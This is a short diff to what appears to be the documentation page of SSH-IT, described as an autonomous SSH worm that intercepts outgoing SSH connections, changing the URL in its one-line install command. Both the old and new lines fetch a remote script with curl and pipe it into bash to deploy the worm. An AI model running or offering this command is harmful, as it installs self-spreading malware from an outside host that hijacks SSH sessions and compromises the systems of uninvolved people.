@@ -19,7 +19,7 @@ description: An autonomous SSH worm that intercepts outgoing SSH connections eve
 SSH-IT can be installed and deployed with a [single command](deploy):
 
 ```shell
-bash -c "$(curl -fsSL ssh-it.thc.org/x)"
+bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
 ```
 
 [Read more](deploy) and learn some [tricks](deploy).
